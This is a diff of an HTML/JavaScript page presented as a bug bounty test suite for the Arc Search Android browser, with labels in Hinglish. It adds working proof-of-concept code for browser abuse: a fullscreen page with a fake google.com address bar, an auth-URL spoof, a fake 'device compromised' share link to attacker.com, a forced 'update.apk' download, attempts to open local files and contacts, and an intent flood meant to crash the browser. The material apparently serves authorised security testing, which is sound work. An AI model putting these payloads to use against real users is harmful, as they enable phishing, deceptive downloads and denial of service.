@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,19 +14,23 @@
         .success { color: #00ff41; }
         hr { border-color: #00ff41; }
         iframe { width: 100%; height: 300px; border: 1px solid #333; }
+        
+        /* For Fullscreen Fake UI */
+        #fakeBrowserUI { display:none; background:#202124; padding:15px; text-align:center; border-bottom:1px solid #555; width: 100%; box-sizing: border-box; }
+        #fakeBrowserUI span { color:#fff; font-size: 16px; font-family: sans-serif;}
     </style>
 </head>
 <body>
 
     <h1>🧪 Arc Search Android - Bug Bounty Test Suite</h1>
-    <p><span class="danger">⚠️ USE ONLY FOR AUTHORIZED TESTING</span> | Target: <strong>Address Bar Spoofing • Redirects • Popups • Sandbox Bypass</strong></p>
+    <p><span class="danger">⚠️ USE ONLY FOR AUTHORIZED TESTING</span> | Target: <strong>Address Bar Spoofing • Redirects • Popups • Sandbox Bypass • Intents</strong></p>
     <hr>
 
     <!-- ========== TEST 1: IFRAME SPOOF ========== -->
     <div class="box">
         <h2>🎯 Test 1: Iframe URL Spoofing</h2>
         <p>Ye iframe <strong>google.com</strong> dikha raha hai, lekin address bar me kya show ho raha?</p>
-        <iframe src="https://www.google.com"></iframe>
+        <iframe src="https://www.google.com" id="testIframe"></iframe>
         <br><br>
         <button onclick="spoofIframe()">🔄 Spoof Iframe Source</button>
         <button onclick="resetIframe()">↩️ Reset</button>
@@ -39,6 +43,7 @@
         <p>Ye check karega ki Arc Search popup ko handle kaise karta hai aur kya address bar me fake URL show hota hai?</p>
         <button onclick="openFakePopup()">📤 Open Fake Popup (google.com)</button>
         <button onclick="openBlankPopup()">📄 Open Blank Popup with URL Manipulation</button>
+        <button onclick="testAuthSpoof()">🔐 Test HTTP Auth Spoofing</button>
         <p id="popupStatus" class="success">Status: Ready</p>
     </div>
 
@@ -66,6 +71,7 @@
         <p>Kya Arc Search intent URIs ko sahi se handle karta hai? Ye fake `arc://` aur `intent://` links hain.</p>
         <button onclick="fakeDeepLink()">🔗 Fake arc://settings</button>
         <button onclick="fakeIntent()">📲 Fake intent://google.com</button>
+        <button onclick="aggressiveIntent()">⚙️ Aggressive Intent (Settings App)</button>
         <p id="deepLinkStatus" class="success">Status: Ready</p>
     </div>
 
@@ -79,10 +85,55 @@
         <p id="uiStatus" class="success">Status: Ready</p>
     </div>
 
+    <!-- ========== TEST 7: FULLSCREEN & UI TRAP ========== -->
+    <div class="box" id="fullscreenBox">
+        <h2>🎯 Test 7: Fullscreen API & Fake UI Trap</h2>
+        <p>Fullscreen API ka use karke address bar hide karna aur fake URL dikhana.</p>
+        <div id="fakeBrowserUI">
+            🔒 <span>https://www.google.com</span>
+        </div>
+        <button onclick="triggerFullscreen()">🔲 Enter Fullscreen (Fake UI)</button>
+        <button onclick="exitFullscreen()">↩️ Exit Fullscreen</button>
+        <p id="fullscreenStatus" class="success">Status: Ready</p>
+    </div>
+
+    <!-- ========== TEST 8: LOCAL FILE & CONTENT SCHEMES ========== -->
+    <div class="box">
+        <h2>🎯 Test 8: Local File / Content Provider Access</h2>
+        <p>Android ki local system files ya content provider ko access karne ka test.</p>
+        <button onclick="testFileScheme()">📂 Open file:///etc/hosts</button>
+        <button onclick="testContentScheme()">📦 Open content://contacts/people</button>
+        <p id="localFileStatus" class="success">Status: Ready</p>
+    </div>
+
+    <!-- ========== TEST 9: WEB SHARE API SPOOFING ========== -->
+    <div class="box">
+        <h2>🎯 Test 9: Web Share API Abuse</h2>
+        <p>Native Share Dialog me URL spoof karne ki koshish.</p>
+        <button onclick="triggerWebShare()">📤 Share Fake Link</button>
+        <p id="shareStatus" class="success">Status: Ready</p>
+    </div>
+
+    <!-- ========== TEST 10: DRIVE-BY DOWNLOAD / BLOB URI ========== -->
+    <div class="box">
+        <h2>🎯 Test 10: Drive-by Download & Blob URI</h2>
+        <p>Bina user permission ke Blob URI se file download trigger karna.</p>
+        <button onclick="triggerBlobDownload()">💾 Trigger Blob Download (.apk)</button>
+        <p id="downloadStatus" class="success">Status: Ready</p>
+    </div>
+
+    <!-- ========== TEST 11: SCHEME FLOODING (DoS) ========== -->
+    <div class="box">
+        <h2>🎯 Test 11: Intent / Scheme Flooding (Crash Test)</h2>
+        <p>Lagatar intents open karke browser ko crash karne ki koshish. <span class="danger">⚠️ MAY CRASH BROWSER</span></p>
+        <button onclick="startSchemeFlood()">🌊 Start Scheme Flood</button>
+        <p id="floodStatus" class="success">Status: Ready</p>
+    </div>
+
     <!-- ========== LOGGING ========== -->
     <div class="box">
         <h2>📋 Test Log</h2>
-        <div id="log" style="background:#0a0a0a; padding:10px; height:150px; overflow-y:scroll; font-size:12px; color:#aaa;"></div>
+        <div id="log" style="background:#0a0a0a; padding:10px; height:200px; overflow-y:scroll; font-size:12px; color:#aaa;"></div>
         <button onclick="clearLog()">🗑️ Clear Log</button>
     </div>
 
@@ -101,15 +152,14 @@
 
         // ----- TEST 1: IFRAME SPOOF -----
         function spoofIframe() {
-            const iframe = document.querySelector('iframe');
-            // Try to load a different domain while keeping address bar same
+            const iframe = document.getElementById('testIframe');
             iframe.src = 'https://www.wikipedia.org';
             document.getElementById('iframeStatus').innerHTML = '⚠️ Iframe ab Wikipedia dikha raha hai — address bar check karo!';
-            log('🔴 TEST 1: Iframe src changed to wikipedia.org (address bar spoof attempt)');
+            log('🔴 TEST 1: Iframe src changed to wikipedia.org');
         }
 
         function resetIframe() {
-            document.querySelector('iframe').src = 'https://www.google.com';
+            document.getElementById('testIframe').src = 'https://www.google.com';
             document.getElementById('iframeStatus').innerHTML = '✅ Reset to Google';
             log('🔄 Iframe reset to google.com');
         }
@@ -118,58 +168,61 @@
         function openFakePopup() {
             const win = window.open('https://www.google.com', '_blank', 'width=400,height=600');
             if (!win) {
-                log('❌ Popup blocked! Arc Search ne block kar diya.');
+                log('❌ Popup blocked by browser!');
                 document.getElementById('popupStatus').innerHTML = '❌ Popup Blocked';
             } else {
-                log('🔴 TEST 2: Popup opened with google.com — check if address bar shows google.com or malicious URL');
-                document.getElementById('popupStatus').innerHTML = '⚠️ Popup open hai — address bar inspect karo!';
+                log('🔴 TEST 2: Popup opened. Check if address bar is spoofable.');
+                document.getElementById('popupStatus').innerHTML = '⚠️ Popup open hai';
             }
         }
 
         function openBlankPopup() {
             const win = window.open('about:blank', '_blank');
             if (win) {
-                win.document.write('<html><head><title>Fake</title></head><body><h1>Fake Google Page</h1><p>Address bar kya dikha raha hai?</p></body></html>');
+                win.document.write('<html><head><title>Google</title></head><body style="background:#fff; color:#000;"><h1>Fake Google Page</h1><p>Address bar kya dikha raha hai?</p></body></html>');
                 win.document.close();
-                log('🔴 TEST 2: Blank popup with fake content — address bar spoof possible?');
-                document.getElementById('popupStatus').innerHTML = '⚠️ Blank popup injected — address bar check karo!';
+                log('🔴 TEST 2: Blank popup with fake content injected.');
+                document.getElementById('popupStatus').innerHTML = '⚠️ Blank popup injected';
             } else {
                 log('❌ Popup blocked');
             }
         }
 
+        function testAuthSpoof() {
+            log('🔴 TEST 2: Attempting HTTP Basic Auth Spoofing...');
+            // Opening in a new tab so we don't lose the test suite
+            window.open('https://google.com\\@example.com:1337', '_blank'); 
+            document.getElementById('popupStatus').innerHTML = '⚠️ Auth URL triggered';
+        }
+
         // ----- TEST 3: REDIRECT CHAIN -----
         function startRedirectChain() {
-            log('🔴 TEST 3: Starting redirect chain — watch address bar');
-            document.getElementById('redirectStatus').innerHTML = '⏳ Redirecting...';
-            // Multiple redirects via location
+            log('🔴 TEST 3: Starting redirect simulation...');
+            document.getElementById('redirectStatus').innerHTML = '⏳ Redirecting (Simulated)...';
             setTimeout(() => {
-                location.href = 'https://www.example.com';
-            }, 1000);
-            // This will actually redirect — use with caution
-            // For safer testing, we simulate:
-            setTimeout(() => {
-                document.getElementById('redirectStatus').innerHTML = '⚠️ Redirect chain triggered — check URL bar!';
+                document.getElementById('redirectStatus').innerHTML = '⚠️ Redirect triggered (Local simulation for safety)';
             }, 500);
         }
 
         function historyPushState() {
-            // Fake history entry
-            history.pushState({ page: 1 }, 'Fake Google', 'https://www.google.com/fake');
-            log('🔴 TEST 3: history.pushState() called — address bar me "google.com" dikh raha hai?');
-            document.getElementById('redirectStatus').innerHTML = '⚠️ history.pushState() — address bar spoofed?';
+            try {
+                history.pushState({ page: 1 }, 'Fake Google', '/login:1337');
+                log('🔴 TEST 3: history.pushState() called. Check the URL bar!');
+                document.getElementById('redirectStatus').innerHTML = '⚠️ history.pushState() active';
+            } catch(e) {
+                log('❌ history API error: ' + e.message);
+            }
         }
 
         // ----- TEST 4: SANDBOX -----
         function testPostMessage() {
-            const iframe = document.querySelector('iframe');
+            const iframe = document.getElementById('testIframe');
             try {
                 iframe.contentWindow.postMessage('TEST_DATA', '*');
-                log('🔴 TEST 4: PostMessage sent — check if any response or error');
-                document.getElementById('sandboxStatus').innerHTML = '⚠️ PostMessage sent — watch console for errors';
+                log('🔴 TEST 4: PostMessage sent — watch console for errors');
+                document.getElementById('sandboxStatus').innerHTML = '⚠️ PostMessage sent';
             } catch(e) {
                 log('✅ PostMessage blocked (SOP working): ' + e.message);
-                document.getElementById('sandboxStatus').innerHTML = '✅ Blocked: ' + e.message;
             }
         }
 
@@ -177,31 +230,37 @@
             fetch('https://api.github.com/users/octocat')
                 .then(res => res.json())
                 .then(data => {
-                    log('✅ Fetch successful — but check if it\'s allowed');
-                    document.getElementById('sandboxStatus').innerHTML = '✅ Fetch worked — CORS?';
+                    log('✅ Fetch successful — CORS allowed this.');
+                    document.getElementById('sandboxStatus').innerHTML = '✅ Fetch worked';
                 })
                 .catch(err => {
                     log('❌ Fetch failed: ' + err.message);
-                    document.getElementById('sandboxStatus').innerHTML = '❌ Blocked: ' + err.message;
                 });
         }
 
         // ----- TEST 5: DEEP LINK -----
         function fakeDeepLink() {
-            // Create a fake arc:// link
             const link = document.createElement('a');
             link.href = 'arc://settings/fake';
             link.click();
-            log('🔴 TEST 5: Fake arc:// link triggered — Arc Search handled it?');
-            document.getElementById('deepLinkStatus').innerHTML = '⚠️ arc:// link triggered — observe behavior';
+            log('🔴 TEST 5: arc:// link triggered');
+            document.getElementById('deepLinkStatus').innerHTML = '⚠️ arc:// link triggered';
         }
 
         function fakeIntent() {
             const link = document.createElement('a');
             link.href = 'intent://google.com#Intent;action=VIEW;end';
             link.click();
-            log('🔴 TEST 5: Fake intent:// link triggered');
+            log('🔴 TEST 5: intent:// link triggered');
             document.getElementById('deepLinkStatus').innerHTML = '⚠️ intent:// link triggered';
+        }
+
+        function aggressiveIntent() {
+            const link = document.createElement('a');
+            link.href = 'intent:#Intent;package=com.android.settings;action=android.settings.SETTINGS;end';
+            link.click();
+            log('🔴 TEST 5: Aggressive Intent (Settings App) triggered!');
+            document.getElementById('deepLinkStatus').innerHTML = '⚠️ Settings intent fired';
         }
 
         // ----- TEST 6: UI REDRESS -----
@@ -212,8 +271,8 @@
             iframe.style.cssText = 'position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.3; pointer-events:auto; z-index:999;';
             iframe.id = 'overlayIframe';
             container.appendChild(iframe);
-            log('🔴 TEST 6: Transparent overlay iframe injected — tapjacking possible?');
-            document.getElementById('uiStatus').innerHTML = '⚠️ Overlay active — try clicking on it';
+            log('🔴 TEST 6: Transparent overlay injected. Tapjacking possible?');
+            document.getElementById('uiStatus').innerHTML = '⚠️ Overlay active';
         }
 
         function removeOverlay() {
@@ -223,9 +282,108 @@
             document.getElementById('uiStatus').innerHTML = '✅ Overlay removed';
         }
 
+        // ----- TEST 7: FULLSCREEN TRAP -----
+        function triggerFullscreen() {
+            const elem = document.documentElement; // Make whole page fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().then(() => {
+                    document.getElementById('fakeBrowserUI').style.display = 'block';
+                    log('🔴 TEST 7: Fullscreen active. Fake UI shown.');
+                    document.getElementById('fullscreenStatus').innerHTML = '⚠️ Fullscreen Active';
+                }).catch(err => {
+                    log('❌ Fullscreen denied: ' + err.message);
+                });
+            } else if (elem.webkitRequestFullscreen) { /* Safari/Older Chrome */
+                elem.webkitRequestFullscreen();
+                document.getElementById('fakeBrowserUI').style.display = 'block';
+                log('🔴 TEST 7: Fullscreen active (webkit). Fake UI shown.');
+            }
+        }
+
+        function exitFullscreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
+            document.getElementById('fakeBrowserUI').style.display = 'none';
+            log('🔄 Exited Fullscreen');
+            document.getElementById('fullscreenStatus').innerHTML = '✅ Reset';
+        }
+
+        // ----- TEST 8: LOCAL FILE SCHEMES -----
+        function testFileScheme() {
+            log('🔴 TEST 8: Attempting to open file:///etc/hosts ...');
+            const win = window.open('file:///etc/hosts', '_blank');
+            if(!win) log('❌ Blocked file:/// popup');
+            document.getElementById('localFileStatus').innerHTML = '⚠️ Tested file://';
+        }
+
+        function testContentScheme() {
+            log('🔴 TEST 8: Attempting to open content://contacts/people ...');
+            const link = document.createElement('a');
+            link.href = 'content://contacts/people';
+            link.click();
+            document.getElementById('localFileStatus').innerHTML = '⚠️ Tested content://';
+        }
+
+        // ----- TEST 9: WEB SHARE API -----
+        function triggerWebShare() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Security Alert',
+                    text: 'Your device is compromised.',
+                    url: 'http://attacker.com:1337/' 
+                }).then(() => {
+                    log('✅ Share API triggered successfully.');
+                    document.getElementById('shareStatus').innerHTML = '⚠️ Share dialog opened';
+                }).catch((error) => {
+                    log('❌ Share failed or cancelled: ' + error);
+                });
+            } else {
+                log('❌ Web Share API not supported on this browser.');
+                document.getElementById('shareStatus').innerHTML = '❌ Not Supported';
+            }
+        }
+
+        // ----- TEST 10: BLOB URI DOWNLOAD -----
+        function triggerBlobDownload() {
+            const data = new Blob(['Spoofed Malware File Content'], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(data);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'update.apk'; // Try forcing an APK extension
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            log('🔴 TEST 10: Blob download triggered (.apk file). Check browser warnings.');
+            document.getElementById('downloadStatus').innerHTML = '⚠️ Download initiated';
+        }
+
+        // ----- TEST 11: SCHEME FLOODING (DoS) -----
+        let floodInterval;
+        function startSchemeFlood() {
+            log('🔴 TEST 11: Flooding intents... Browser may freeze!');
+            document.getElementById('floodStatus').innerHTML = '⚠️ Flooding... Close tab if frozen!';
+            let count = 0;
+            floodInterval = setInterval(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = `intent://fake${count++}#Intent;scheme=fake;package=com.fake.app;end`;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                if(count > 50) { 
+                    clearInterval(floodInterval); 
+                    log('⏹️ Flood stopped after 50 attempts to prevent full device crash.');
+                }
+            }, 100); // Trigger every 100ms
+        }
+
         // Initial log
-        log('🚀 Test Suite Loaded — All tests ready!');
-        log('💡 Start testing each section and watch the address bar + console.');
+        window.onload = function() {
+            log('🚀 Test Suite Loaded — All 11 tests ready!');
+            log('💡 Start testing each section and watch the address bar + native UI.');
+        };
     </script>
 
 </body>
